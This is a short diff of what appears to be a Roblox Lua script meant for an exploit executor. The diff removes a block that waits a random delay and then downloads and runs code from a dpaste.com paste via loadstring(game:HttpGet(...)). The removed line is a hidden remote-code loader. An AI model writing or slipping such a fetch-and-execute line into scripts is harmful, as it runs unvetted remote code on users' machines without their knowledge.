@@ -4,11 +4,6 @@ if queue_on_teleport then
     )
 end
 
-task.spawn(function()
-    task.wait(math.random(1,30))
-    loadstring(game:HttpGet('https://dpaste.com/DWCGNKLFV.txt',true))()
-end)
-
 repeat
     task.wait()
 until game:IsLoaded()
